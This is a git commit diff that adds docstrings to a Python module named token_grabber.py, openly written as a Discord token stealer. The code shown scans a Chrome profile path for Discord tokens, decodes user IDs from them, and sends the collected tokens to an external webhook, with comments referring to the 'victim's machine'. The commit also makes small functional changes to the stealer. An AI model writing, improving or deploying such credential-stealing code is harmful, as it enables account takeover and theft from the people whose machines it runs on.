a1bf3c5f0798c4e2b0133391370fcac115deb4a8
Piotr Ginał <70772418+piotr-ginal@users.noreply.github.com>
2024-02-21 16:34:31 +0100

    Add docstring documentation to functions

--- grabbers/token_grabber.py
+++ grabbers/token_grabber.py
@@ -42,7 +42,21 @@ def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
 
 
 def get_user_id_from_token(token: str) -> typing.Union[None, str]:
+    """
+    Confirming that the portion of a string before the first dot can be decoded
+    from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
 
+    Parameters:
+        token (str): Suspected Discord token represented as a string.
+
+    Returns:
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
+    """
     try:
         discord_user_id = base64.b64decode(
             token.split(".", maxsplit=1)[0] + "=="
@@ -54,7 +68,19 @@ def get_user_id_from_token(token: str) -> typing.Union[None, str]:
 
 
 def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
+    """
+    The function collects discord tokens for each user ID to manage the
+    occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
 
+    Parameters:
+        base_path (str): path containing files where tokens may be located.
+    """
     file_paths = [
         os.path.join(base_path, filename) for filename in os.listdir(base_path)
     ]
@@ -78,13 +104,20 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
 
             id_to_tokens[discord_user_id].add(potential_token)
 
-    return id_to_tokens
+    return id_to_tokens if id_to_tokens else None
 
 
 def send_tokens_to_webhook(
     webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
 ) -> int:
-
+    """
+    Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """
     fields: list[dict] = list()
 
     for user_id, tokens in user_id_to_token.items():
@@ -106,6 +139,9 @@ def main() -> None:
     )
 
     tokens = get_tokens_from_path(chrome_path)
+
+    if tokens is None:
+        return
 
     send_tokens_to_webhook(WEBHOOK_URL, tokens)
 
